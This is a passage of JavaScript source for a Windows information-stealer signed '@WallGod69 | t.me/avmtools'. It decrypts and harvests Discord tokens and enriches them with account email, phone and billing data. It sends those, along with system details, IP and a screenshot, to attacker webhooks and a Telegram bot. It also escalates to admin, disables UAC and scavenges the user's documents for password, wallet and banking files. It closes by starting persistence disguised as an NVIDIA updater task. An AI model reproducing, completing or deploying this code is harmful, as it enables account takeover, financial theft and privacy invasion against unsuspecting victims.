                const ownerOrAdmin = guild.owner ? "<:7212roleowner:1268574022933811253> Owner" : "<:admin:967851956930482206> Admin";
                const line = `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;

                if (result.length + line.length >= 1024) {
                    result += "\`Too many servers to display.\`";
                    break;
                }
                result += line;
            }
            return result || "```No HQ Guilds```";
        } catch (error) { return "```Error retrieving HQ Guilds```"; }
    }

    async function getBilling(token) {
        try {
            await sleep(1000);
            const res = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                headers: discordHeaders(token),
                timeout: 5000
            });
            let bi = '';
            res.data.forEach(z => {
                if (z.type == 2 && z.invalid != !0) {
                    bi += "<:946246524504002610:962747802830655498>";
                } else if (z.type == 1 && z.invalid != !0) {
                    bi += "<:rustler:987692721613459517>";
                }
            });
            if (bi == '') bi = "```No Billing```";
            return bi;
        } catch (err) { return "```No Billing```"; }
    }

    const badgesDict = {
        Discord_Employee: { Value: 1, Emoji: "<:staff:874750808728666152>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:partner:874750808678354964>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:hypesquad_events:874750808594477056>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:bughunter_1:874750808426692658>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:early_supporter:874750808414113823>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:bughunter_2:874750808430874664>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:developer:874750808472825986>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:bravery:874750808388952075>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:brilliance:874750808338608199>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:balance:874750808267292683>", Rare: false },
        Discord_Official_Moderator: { Value: 262144, Emoji: "<:moderator:976739399998001152>", Rare: true }
    };

    function getBadges(flags) {
        let b = '';
        for (const prop in badgesDict) {
            let o = badgesDict[prop];
            if ((flags & o.Value) == o.Value) b += o.Emoji;
        };
        if (b == '') return "```No Badges```";
        return `${b}`;
    }

    async function getNitro(flags, id, token) {
        switch (flags) {
            case 1:
                return "<:946246402105819216:962747802797113365>";
            case 2:
                let info;
                try {
                    await sleep(1000);
                    const res = await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                        headers: discordHeaders(token),
                        timeout: 5000
                    });
                    info = res.data;
                } catch (e) { return "<:946246402105819216:962747802797113365>"; }

                if (!info || !info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

                let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"];
                var i = 0;

                try {
                    let d = new Date(info.premium_guild_since);
                    let now = new Date();
                    let monthsDiff = (now.getFullYear() - d.getFullYear()) * 12 + (now.getMonth() - d.getMonth());

                    if (monthsDiff >= 24) i = 8;
                    else if (monthsDiff >= 18) i = 7;
                    else if (monthsDiff >= 15) i = 6;
                    else if (monthsDiff >= 12) i = 5;
                    else if (monthsDiff >= 9) i = 4;
                    else if (monthsDiff >= 6) i = 3;
                    else if (monthsDiff >= 3) i = 2;
                    else if (monthsDiff >= 2) i = 1;
                    else i = 0;

                } catch (e) { i = 0; }
                return `<:946246402105819216:962747802797113365> ${boost[i]}`;
            default:
                return "```No Nitro```";
        };
    }

    const tokens = [];
    let tokensCount = 0;

    try {
        const discordAppRegex = /dQw4w9WgXcQ:[^"]*/g;
        const browserTokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g;

        const pathsToScan = PATHS.discord;

        const discordKeyCache = {};

        for (const scanPath of pathsToScan) {
            if (!fs.existsSync(scanPath)) {
                continue;
            }

            const pathName = path.basename(scanPath);
            let masterKey = null;

            try {
                let localStatePath = path.join(scanPath, 'Local State');
                if (!fs.existsSync(localStatePath)) {
                    localStatePath = path.join(scanPath, '..', 'Local State');
                }

                const cacheKey = path.resolve(localStatePath);

                if (discordKeyCache[cacheKey]) {
                    masterKey = discordKeyCache[cacheKey];

                } else if (fs.existsSync(localStatePath)) {
                    const content = fs.readFileSync(localStatePath, 'utf8');
                    const json = JSON.parse(content);
                    if (json.os_crypt && json.os_crypt.encrypted_key) {

                        const encryptedKey = Buffer.from(json.os_crypt.encrypted_key, 'base64').slice(5);
                        const keyArray = Array.from(encryptedKey);

                        const startDecryption = Date.now();
                        const decryptedKeyLines = await new Promise((resolve, reject) => {
                            const psScript = `Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(${keyArray}), $null, 'CurrentUser')`;
                            const child = exec(
                                `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "-"`,
                                { timeout: 20000, windowsHide: true },
                                (error, stdout, stderr) => {
                                    if (error) reject(error);
                                    else resolve(stdout);
                                }
                            );
                            child.stdin.write(psScript);
                            child.stdin.end();
                        }).then(stdout => stdout.split('\r\n')).catch(err => { throw err; });

                        const filteredKey = decryptedKeyLines.filter((line) => line !== '');
                        masterKey = Buffer.from(filteredKey);
                        discordKeyCache[cacheKey] = masterKey;
                    }
                }
            } catch (keyError) {
            }

            let leveldbPath = path.join(scanPath, 'Local Storage', 'leveldb');
            if (!fs.existsSync(leveldbPath)) {
                leveldbPath = scanPath;
            }

            if (!fs.existsSync(leveldbPath)) {
                continue;
            }

            try {
                const files = fs.readdirSync(leveldbPath);
                const targetFiles = files.filter(f => f.endsWith('.ldb') || f.endsWith('.log'));


                for (const file of targetFiles) {
                    try {
                        const filePath = path.join(leveldbPath, file);
                        const fStats = fs.statSync(filePath);
                        if (fStats.size > 10 * 1024 * 1024) continue;

                        const content = fs.readFileSync(filePath, 'utf8');
                        const lines = content.split('\n');

                        for (const line of lines) {
                            if (masterKey) {
                                const matches = line.match(discordAppRegex);
                                if (matches) {
                                    for (const match of matches) {
                                        try {
                                            const encodedPass = match.split('dQw4w9WgXcQ:')[1];
                                            if (!encodedPass) continue;

                                            const decodedPass = Buffer.from(encodedPass, 'base64');
                                            const iv = decodedPass.slice(3, 15);
                                            const encrypted = decodedPass.slice(15, decodedPass.length - 16);
                                            const authTag = decodedPass.slice(decodedPass.length - 16, decodedPass.length);

                                            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                                            decipher.setAuthTag(authTag);
                                            const token = decipher.update(encrypted, 'base64', 'utf-8') + decipher.final('utf-8');

                                            if (token && !tokens.some(t => t.token === token)) {
                                                tokens.push({
                                                    browser: `Discord Encrypted(${pathName})`,
                                                    token: token
                                                });
                                                tokensCount++;
                                            }
                                        } catch (decryptErr) { }
                                    }
                                }
                            }

                            const browserMatches = line.match(browserTokenRegex);
                            if (browserMatches) {
                                for (const token of browserMatches) {
                                    if (token && !tokens.some(t => t.token === token)) {
                                        tokens.push({
                                            browser: `Browser / Generic(${pathName})`,
                                            token: token
                                        });
                                        tokensCount++;
                                    }
                                }
                            }
                        }
                    } catch (fileErr) { }
                }
            } catch (scanError) {
                logError(scanError, `fetchDiscordTokens - scan - ${pathName} `);
            }
        }

        if (tokens.length > 0) {
            const tokensDir = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(tokensDir)) {
                fs.mkdirSync(tokensDir, { recursive: true });
            }

            const tokensFilePath = path.join(tokensDir, 'Discord_Tokens.txt');
            let tokensContent = user.copyright;

            let ip = "Unknown";
            try {
                const ipRes = await axios.get("http://ip-api.com/json/", { timeout: 5000 });
                ip = ipRes.data.query;
            } catch (err) { }

            for (const tokenData of tokens) {
                const token = tokenData.token;
                let text = `================\nBrowser: ${tokenData.browser} \nToken: ${token} \n`;
                const userData = await getUserData(token);

                if (userData) {
                    text += `ID: ${userData.id}\nUsername: ${userData.username}#${userData.discriminator}\nEmail: ${userData.email}\nPhone: ${userData.phone}\nMFA: ${userData.mfa_enabled}\nNitro: ${userData.premium_type}\nFlags: ${userData.flags}\nBio: ${userData.bio}\n`;

                    try {
                        const billing = await getBilling(token);
                        const hqGuilds = await getHQGuilds(token);
                        const badges = getBadges(userData.flags);
                        const nitro = await getNitro(userData.premium_type, userData.id, token);

                        const userInformationEmbed = {
                            title: `${userData.username}#${userData.discriminator} (${userData.id})`,
                            color: 0x303037,
                            author: {
                                name: "Discord Session Detected",
                                icon_url: "https://i.ibb.co/84zCWC73/icon.png"
                            },
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
                            },
                            fields: [
                                {
                                    name: ":key: Token:",
                                    value: "```" + token + "```",
                                },
                                {
                                    name: ":envelope: Email:",
                                    value: "``" + `\`${userData.email}\`` + "``",
                                    inline: true
                                },
                                {
                                    name: ":globe_with_meridians: IP:",
                                    value: "``" + `\`${ip}\`` + "``",
                                    inline: true
                                },
                                {
                                    name: "<:mobile88:1210411486120517663> Phone:",
                                    value: "``" + `\`${userData.phone || "None"}\`` + "``",
                                    inline: true
                                },
                                {
                                    name: "",
                                    value: "‎ ",
                                    inline: false
                                },
                                {
                                    name: "",
                                    value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${badges}`,
                                    inline: true
                                },
                                {
                                    name: "",
                                    value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${nitro}`,
                                    inline: true
                                },
                                {
                                    name: "",
                                    value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
                                    inline: true
                                },
                                {
                                    name: "",
                                    value: "‎ ",
                                    inline: false
                                },
                                {
                                    name: ":shield: HQ Guilds:",
                                    value: hqGuilds,
                                    inline: false
                                },
                            ],
                            footer: {
                                text: `${os.hostname()} | @WallGod69 | t.me/avmtools | ${VERSION}`,
                                icon_url: 'https://i.ibb.co/84zCWC73/icon.png'
                            }
                        };

                        active_nodes.length = 0;
                        if (discordWebhookUrl && discordWebhookUrl !== 'REMPLACE_ME') active_nodes.push(discordWebhookUrl);
                        if (fallback_conf && Array.isArray(fallback_conf) && fallback_conf.length > 0) {
                            fallback_conf.forEach(conf => {
                                try {
                                    if (conf.includes('http')) active_nodes.push(conf);
                                } catch (e) { }
                            });
                        }

                        let sid = 1;
                        for (const url of active_nodes) {
                            await sleep(2500);
                            try {
                                await axios.post(url, {
                                    embeds: [userInformationEmbed]
                                }, { timeout: 10000 });
                                logSuccess(`0x${sid}T1`);
                            } catch (err) {
                                logError(`0x${sid}T2`, 'DX_03');
                            }
                            sid++;
                        }
                    } catch (err) {
                    }
                }
                tokensContent += text + '\n';
            }

            fs.writeFileSync(tokensFilePath, tokensContent, 'utf8');

        }

    } catch (error) {
        logError(error, 'fetchDiscordTokens');
    }

    return tokensCount;
}

async function sendDiscordEmbed(screenshotBuffer, downloadLink, zipSize, passwordsCount, cookiesCount, autofillCount, tokensCount, socialsCount, gamesCount, walletsCount) {
    try {
        let ipInfo = 'Not available';
        try {
            const ipResponse = await axios.get('http://ip-api.com/json/', { timeout: 10000 });
            ipInfo = `${ipResponse.data.query} - ${ipResponse.data.country}, ${ipResponse.data.city} `;
        } catch (e) {
            try {
                const fallback = await axios.get('https://api.ipify.org?format=json', { timeout: 10000 });
                ipInfo = fallback.data.ip;
            } catch (err2) {
                logError(e, 'sendDiscordEmbed-ipLookup');
                ipInfo = 'IP retrieval error';
            }
        }

        const systemInfo = `User: ${user.username}
PC: ${user.hostname}
OS: ${user.type} ${user.release}
Arch: ${user.arch}
RAM: ${(user.ram / 1024 / 1024 / 1024).toFixed(2)} GB
Cores: ${user.countCore}
UUID: ${user.randomUUID}
Started: ${new Date(user.start).toLocaleString()}
Uptime: ${Math.floor(user.uptime / 3600)}h ${Math.floor((user.uptime % 3600) / 60)} m
IP: ${ipInfo}
Directory: ${user.fileLoc} `;

        const totalSocialsCount = (socialsCount || 0) + (tokensCount || 0);

        const payload = {
            embeds: [{
                title: '',
                description: '‎',
                color: 0x303037,
                author: {
                    name: `${user.hostname} | System Information | @WallGod69`,
                    icon_url: 'https://i.ibb.co/84zCWC73/icon.png',
                },
                fields: [
                    {
                        name: '<a:ezgif6fb4a91bfdb1d6e8:1466846913352564736> Passwords',
                        value: '```' + passwordsCount.toString() + '```',
                        inline: true,
                    },
                    {
                        name: '<a:ezgif47677b19991af31d:1466838443496575172> Cookies',
                        value: '```' + cookiesCount.toString() + '```',
                        inline: true,
                    },
                    {
                        name: '📋 Autofills',
                        value: '```' + autofillCount.toString() + '```',
                        inline: true,
                    },
                    {
                        name: '<a:ezgif76c1f0814cb13e11:1466857030118801532> Socials',
                        value: '```' + totalSocialsCount.toString() + '```',
                        inline: true,
                    },
                    {
                        name: '<a:ezgif32bff8f86ee21b42:1466865550347993289> Games',
                        value: '```' + gamesCount.toString() + '```',
                        inline: true,
                    },
                    {
                        name: '<a:ezgif69c15e2348c7f50f:1466845005237719071> Wallets',
                        value: '```' + (walletsCount || 0).toString() + '```',
                        inline: true,
                    },
                    {
                        name: "<a:system:1205123587632275517> Information", value: `\`\`\`\n${systemInfo}\n\`\`\``, inline: false
                    },
                    {
                        name: '‎ ',
                        value: downloadLink ? `<a:ezgif60edbd9e19348b91:1466848649651683430> [\`${locale}-${computerName}.zip\`](${downloadLink})\` (${zipSize})\`\n` : `❌ **Upload failed (${zipSize}) (Look in log.txt)**`,
                        inline: false,
                    }
                ],
                image: { url: 'attachment://screenshot.png' },
                footer: {
                    text: computerName + " | @Wallgod69 | t.me/avmtools | " + VERSION,
                    icon_url: "https://i.ibb.co/84zCWC73/icon.png"
                }
            }]
        };

        try {
            if (payload.embeds && payload.embeds[0]) {
                const embed = payload.embeds[0];
                if (embed.fields) {
                    embed.fields.forEach(field => {
                        if (field.value && field.value.length > 1020) {
                            field.value = field.value.substring(0, 1000) + "... (truncated)";
                        }
                    });
                }
                if (embed.description && embed.description.length > 2000) {
                    embed.description = embed.description.substring(0, 1990) + "... (truncated)";
                }
            }
        } catch (e) { }
        active_nodes.length = 0;
        if (discordWebhookUrl && discordWebhookUrl !== 'REMPLACE_ME') active_nodes.push(discordWebhookUrl);
        if (fallback_conf && Array.isArray(fallback_conf) && fallback_conf.length > 0) {
            fallback_conf.forEach(conf => {
                try {
                    if (conf.includes('http')) active_nodes.push(conf);
                } catch (e) { }
            });
        }

        let sid = 1;
        for (const url of active_nodes) {
            await new Promise(resolve => setTimeout(resolve, 3000));

            try {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', screenshotBuffer, { filename: 'screenshot.png', contentType: 'image/png' });
                await axios.post(url, formData, {
                    headers: formData.getHeaders(),
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    timeout: 45000
                });
                logSuccess(`0x${sid}A7`);
            } catch (err) {
                const errInfo = err.response ? (JSON.stringify(err.response.data) || err.message) : err.message;
                logError(`0x${sid}E1: ${errInfo}`, 'DX_01');

                await new Promise(resolve => setTimeout(resolve, 2000));

                try {
                    const fallbackPayload = JSON.parse(JSON.stringify(payload));
                    if (fallbackPayload.embeds && fallbackPayload.embeds[0]) {
                        delete fallbackPayload.embeds[0].image;
                        fallbackPayload.embeds[0].footer.text += " | ❌ Image Failed";
                    }
                    await axios.post(url, fallbackPayload, {
                        headers: { 'Content-Type': 'application/json' },
                        timeout: 20000
                    });
                    logSuccess(`0x${sid}B2`);
                } catch (err2) {
                    logError(`0x${sid}E2`, 'DX_02');
                }
            }
            sid++;
        }

        if (!downloadLink) {
            try {
                const logFilePath = path.join(mainFolderPath, 'log.txt');
                let logContent = 'No log file found.';
                if (fs.existsSync(logFilePath)) {
                    logContent = fs.readFileSync(logFilePath, 'utf8');
                }

                const logChunks = [];
                const chunkSize = 3500;
                for (let i = 0; i < logContent.length; i += chunkSize) {
                    logChunks.push(logContent.substring(i, i + chunkSize));
                }

                let lid = 1;
                for (const url of active_nodes) {
                    await new Promise(resolve => setTimeout(resolve, 3000));

                    for (let i = 0; i < logChunks.length; i++) {
                        await new Promise(resolve => setTimeout(resolve, 2500));

                        const logEmbed = {
                            title: `📂 Debug Log - Part ${i + 1}/${logChunks.length}`,
                            description: `\`\`\`text\n${logChunks[i]}\n\`\`\``,
                            color: 0x303037,
                            author: {
                                name: `${user.hostname} | Error Log | @WallGod69`,
                                icon_url: 'https://i.ibb.co/84zCWC73/icon.png',
                            },
                            footer: {
                                text: `${computerName} | @Wallgod69 | t.me/avmtools | ${VERSION}`,
                                icon_url: "https://i.ibb.co/84zCWC73/icon.png"
                            }
                        };

                        try {
                            await axios.post(url, {
                                embeds: [logEmbed],
                                username: "System Service",
                                avatar_url: "https://i.ibb.co/84zCWC73/icon.png"
                            }, {
                                headers: { 'Content-Type': 'application/json' },
                                timeout: 30000
                            });
                        } catch (logSendErr) {
                            console.error(`0x${lid}L9:`, logSendErr.message);
                        }
                    }
                    lid++;
                }
            } catch (logEmbedError) {
                logError(logEmbedError, 'SR_05');
            }
        }
    } catch (error) {
        logError(error, 'sendDiscordEmbed');
    }
}

async function sendTelegramMessage(screenshotBuffer, downloadLink, zipSize, passwordsCount, cookiesCount, autofillCount, tokensCount, socialsCount, gamesCount, walletsCount) {
    try {
        if (!telegramBotToken || telegramBotToken === 'REMPLACE_ME' || !telegramChatId || telegramChatId === 'REMPLACE_ME') {
            return;
        }

        let ipInfo = 'Not available';
        try {
            const ipResponse = await axios.get('http://ip-api.com/json/', { timeout: 10000 });
            ipInfo = `${ipResponse.data.query} - ${ipResponse.data.country}, ${ipResponse.data.city}`;
        } catch (e) {
            try {
                const fallback = await axios.get('https://api.ipify.org?format=json', { timeout: 10000 });
                ipInfo = fallback.data.ip;
            } catch (err2) {
                logError(e, 'sendTelegramMessage-ipLookup');
                ipInfo = 'IP retrieval error';
            }
        }

        const totalSocialsCount = (socialsCount || 0) + (tokensCount || 0);

        const message = `
<b>${user.hostname} | System Information</b>

<b>Collected Data:</b>
━━━━━━━━━━━━━━━━━━━━
🔐 <b>Passwords:</b> <code>${passwordsCount}</code>
🍪 <b>Cookies:</b> <code>${cookiesCount}</code>
📋 <b>Autofills:</b> <code>${autofillCount}</code>
📱 <b>Socials:</b> <code>${totalSocialsCount}</code>
🎮 <b>Games:</b> <code>${gamesCount}</code>
💰 <b>Wallets:</b> <code>${walletsCount || 0}</code>

⚙ <b>System Information:</b>
━━━━━━━━━━━━━━━━━━━━
<b>User:</b> <code>${user.username}</code>
<b>PC:</b> <code>${user.hostname}</code>
<b>OS:</b> <code>${user.type} ${user.release}</code>
<b>Arch:</b> <code>${user.arch}</code>
<b>RAM:</b> <code>${(user.ram / 1024 / 1024 / 1024).toFixed(2)} GB</code>
<b>Cores:</b> <code>${user.countCore}</code>
<b>UUID:</b> <code>${user.randomUUID}</code>
<b>Started:</b> <code>${new Date(user.start).toLocaleString()}</code>
<b>Uptime:</b> <code>${Math.floor(user.uptime / 3600)}h ${Math.floor((user.uptime % 3600) / 60)}m</code>
<b>IP:</b> <code>${ipInfo}</code>
<b>Directory:</b> <code>${user.fileLoc}</code>

${downloadLink ? `<b>Download:</b> <a href="${downloadLink}"><code>${locale}-${computerName}.zip</code></a><code> (${zipSize})</code>` : `❌ <b>Upload failed</b> (<code>${zipSize}</code>) (Look in log.txt)`}

━━━━━━━━━━━━━━━━━━━━
🔹 ${computerName} | @Wallgod69 | t.me/avmtools | ${VERSION}
`.trim();

        const formData = new FormData();
        formData.append('chat_id', telegramChatId);
        formData.append('photo', screenshotBuffer, {
            filename: 'screenshot.png',
            contentType: 'image/png'
        });
        formData.append('caption', message);
        formData.append('parse_mode', 'HTML');

        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;

        const resp = await axios.post(telegramUrl, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 30000
        });

        if (resp.status >= 200 && resp.status < 300) {
        }

        if (!downloadLink) {
            try {
                const logFilePath = path.join(mainFolderPath, 'log.txt');
                if (fs.existsSync(logFilePath)) {
                    const logFormData = new FormData();
                    logFormData.append('chat_id', telegramChatId);
                    logFormData.append('document', fs.createReadStream(logFilePath), {
                        filename: 'log.txt',
                        contentType: 'text/plain'
                    });
                    logFormData.append('caption', `❌ <b>Upload failed</b> - Debug log for <code>${user.hostname}</code>`);
                    logFormData.append('parse_mode', 'HTML');

                    const telegramDocUrl = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
                    await axios.post(telegramDocUrl, logFormData, {
                        headers: logFormData.getHeaders(),
                        timeout: 30000
                    });
                }
            } catch (logErr) { }
        }
    } catch (error) {
        logError(error, 'sendTelegramMessage');
    }
}

function hasAdminPrivileges() {
    try {
        execSync('net session', { stdio: 'ignore', timeout: 5000, windowsHide: true });
        return true;
    } catch (e) {
        return false;
    }
}

function relaunchAsAdmin() {
    const scriptPath = process.execPath;
    const scriptDir = path.dirname(scriptPath);
    const currentArgs = process.argv.slice(1);
    if (!currentArgs.includes('--hidden')) currentArgs.push('--hidden');

    if (!currentArgs.includes('--folder')) {
        currentArgs.push('--folder', mainFolderName);
    }

    const scriptArgs = currentArgs.map(arg => `"${arg}"`).join(',');

    const psCommand = `Start-Process -FilePath "${scriptPath}" -ArgumentList ${scriptArgs} -WorkingDirectory "${scriptDir}" -Verb RunAs -WindowStyle Hidden`;

    try {
        const base64Command = Buffer.from(psCommand, 'utf16le').toString('base64');
        execSync(`powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${base64Command}`, {
            windowsHide: true,
            stdio: 'ignore',
            timeout: 30000
        });
    } catch (e) {
        logError(e, 'relaunchAsAdmin');
    }
    process.exit(0);
}


async function mainAdminCheck() {

    if (!hasAdminPrivileges()) {

        relaunchAsAdmin();
    } else {

    }
}

function disableuac() {
    if (process.platform !== 'win32') return;
    const cmd = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f; ' +
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; ' +
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f';
    try {
        execSync(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${cmd}"`, { stdio: 'ignore', windowsHide: true });
    } catch (e) {
        logError(e, 'disableuac');
    }
}

async function fetchFileVPN() {
    try {
        const vpnDir = path.join(mainFolderPath, 'VPN');
        const vpnPaths = [
            path.join(process.env.APPDATA, 'OpenVPN Connect\\profiles'),
            path.join(process.env.LOCALAPPDATA, 'NordVPN'),
            path.join(process.env.APPDATA, 'ProtonVPN')
        ];
        let vpnCount = 0;

        for (const p of vpnPaths) {
            if (fs.existsSync(p)) {
                if (!fs.existsSync(vpnDir)) fs.mkdirSync(vpnDir, { recursive: true });
                await copyFolderRecursive(p, path.join(vpnDir, path.basename(p)));
                vpnCount++;
            }
        }

        const scavengerTempDir = path.join(os.tmpdir(), generateRandomString(10));
        if (!fs.existsSync(scavengerTempDir)) fs.mkdirSync(scavengerTempDir, { recursive: true });

        const userHome = os.homedir();
        const foldersToSearch = [
            'Videos', 'Desktop', 'Documents', 'Downloads', 'Pictures',
            path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
        ];
        const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
        const keywords = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "bot", "atomic", "acount", "paypal", "banque", "metamask", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "seed", "mnemonic", "memoric", "private", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privÃ©", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note", "phantom", "trust", "ledger", "trezor", "binance", "coinbase", "solana", "ethereum", "invoice", "facture", "passport", "passeport", "identity", "identite", "id_card", "permis", "confidential", "stripe", "visa", "mastercard", "card", "amex", "wire", "transfer", "iban", "credentials", "creds", "database", "sql", "dump", "config", "env", "ssh", "putty", "vnc", "anydesk", "teamviewer", "authy", "kraken", "kucoin", "gateio", "okx", "bybit", "bitget", "mexc", "mnemonique", "recovery", "identifiants_connexion", "authenticator"];

        let scavengedCount = 0;
        for (const folder of foldersToSearch) {
            const directory = path.join(userHome, folder);
            if (fs.existsSync(directory)) {
                try {
                    const filesInFolder = fs.readdirSync(directory);
                    for (const file of filesInFolder) {
                        try {
                            const filePath = path.join(directory, file);
                            const stat = fs.statSync(filePath);
                            if (stat.isFile()) {
                                const ext = path.extname(file).toLowerCase();
                                if (ext === '.exe' || ext === '.zip' || ext === '.rar' || ext === '.7z' || ext === '.msi' || ext === '.iso' || ext === '.msix') continue;

                                const name = path.basename(file).toLowerCase();
                                if (allowedExtensions.includes(ext) && keywords.some(k => name.includes(k))) {
                                    if (stat.size > (MAX_ITEM_SIZE)) {
                                        logInfo(`[Scavenger] Skipping file too large: ${filePath} (${formatBytes(stat.size)})`);
                                        continue;
                                    }
                                    if (globalCopiedSize + stat.size > MAX_TEMPORARY_TOTAL_SIZE) {
                                        if (!globalLimitReached) {
                                            logInfo(`[Scavenger] Global storage limit reached at: ${filePath}`);
                                            globalLimitReached = true;
                                        }
                                        break;
                                    }
                                    fs.copyFileSync(filePath, path.join(scavengerTempDir, file));
                                    scavengedCount++;
                                    globalCopiedSize += stat.size;
                                }
                            }
                        } catch (e) { }
                    }
                } catch (e) { }
            }
        }

        if (scavengedCount > 0) {
            try {
                const zipPath = path.join(mainFolderPath, 'stolen_files.zip');
                const output = fs.createWriteStream(zipPath);
                const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools" });
                archive.pipe(output);
                archive.directory(scavengerTempDir, false);
                await archive.finalize();
            } catch (e) { logError(e, 'fetchFileVPN-zip'); }
        }

        try { fs.rmSync(scavengerTempDir, { recursive: true, force: true }); } catch (e) { }

        return vpnCount + scavengedCount;
    } catch (e) {
        logError(e, 'fetchFileVPN');
        return 0;
    }
}

function finalizeLog() {
    try {
        const endMessage = `\nScript finished at: ${new Date().toISOString()}\n`;
        const logFilePath = path.join(mainFolderPath, 'log.txt');
        fs.appendFileSync(logFilePath, endMessage, 'utf8');
    } catch (error) {
    }
}

function decodeBase64(str) {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    let bits = 0, value = 0, index = 0;
    const out = new Uint8Array((str.length * 5) / 8);
    for (let i = 0; i < str.length; i++) {
        value = (value << 5) | alphabet.indexOf(str[i].toUpperCase());
        bits += 5;
        if (bits >= 8) {
            out[index++] = (value >>> (bits - 8)) & 0xff;
            bits -= 8;
        }
    }
    return Buffer.from(out.slice(0, index));
}

async function initializeService() {

    if (os.platform() !== 'win32') {
        return;
    }

    const serviceId = generateRandomString(8);
    const fileName = 'sys_core_' + serviceId + '.ps1';

    try {
        const taskCleanCmd = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like \'NVIDIA_SelfUpdate_*\'} | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue }"';
        execSync(taskCleanCmd, { stdio: 'ignore', windowsHide: true, timeout: 5000 });
    } catch (taskErr) {
        try {
            execSync('schtasks /delete /tn NVIDIA_SelfUpdate_* /f', { stdio: 'ignore', windowsHide: true });
        } catch (e) { }
    }

